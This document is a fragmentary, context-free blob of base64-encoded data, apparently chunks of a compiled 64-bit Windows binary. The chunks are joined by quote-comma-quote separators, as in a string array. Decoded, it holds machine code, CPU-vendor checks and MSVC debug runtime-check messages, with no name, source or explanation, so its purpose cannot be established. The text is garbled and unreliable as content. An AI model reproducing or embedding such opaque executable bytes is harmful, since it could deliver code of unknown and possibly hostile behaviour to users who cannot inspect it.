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','MzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','MzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzM','zMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzM','Gl6ZWQuAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFRoZSB2YWx1ZSBvZiBFU1Agd2FzIG5vdCBwcm9wZXJseSBzYXZlZCBhY3Jvc3MgYSBmdW5jdGlvbiBjYWxsLiAgVGhpcyBpcyB1c3VhbGx5IGEgcmVzdWx0IG9mIGNhbGxpbmcgYSBmdW5jdGlvbiBkZWNsYXJlZCB3aXRoIG9uZSBjYWxsaW5nIGNvbnZlbnRpb24gd2l0aCBhIGZ1bmN0aW9uIHBvaW50ZXIgZGVjbGFyZWQgd2l0aCBhIGRpZmZlcmVudCBjYWxsaW5nIGNvbnZlbnRpb24uCg0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQSBjYXN0IHRvIGEgc21hbGxlciBkYXRhIHR5cGUgaGFzIGNhdXNlZCBhIGxvc3Mgb2YgZGF0YS4gIElmIHRoaXMgd2FzIGludGVudGlvbmFsLCB5b3Ugc2hvdWxkIG1hc2sgdGhlIHNvdXJjZSBvZiB0aGUgY2FzdCB3aXRoIHRoZSBhcHByb3ByaWF0ZSBiaXRtYXNrLiAgRm9yIGV4YW1wbGU6ICAKDQljaGFyIGMgPSAoaSAmIDB4RkYpOwoNQ2hhbmdpbmcgdGhlIGNvZGUgaW4gdGhpcyB3YXkgd2lsbCBub3QgYWZmZWN0IHRoZSBxdWFsaXR5IG9mIHRoZSByZXN1bHRpbmcgb3B0aW1pemVkIGNvZGUuCg0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABTdGFjayBtZW1vcnkgd2FzIGNvcnJ1cHRlZAoNAAAAAAAAAAAAAAAAQSBsb2NhbCB2YXJpYWJsZSB3YXMgdXNlZCBiZWZvcmUgaXQgd2FzIGluaXRpYWxpemVkCg0AAAAAAAAAAAAAAFN0YWNrIG1lbW9yeSBhcm91bmQgX2FsbG9jYSB3YXMgY29ycnVwdGVkCg0AAAAAAAAAAAAAAAAAVW5rbm93biBSdW50aW1lIENoZWNrIEVycm9yCg0AAAAAAAAAAAAAAFIAdQBuAHQAaQBtAGUAIABDAGgAZQBjAGsAIABFAHIAc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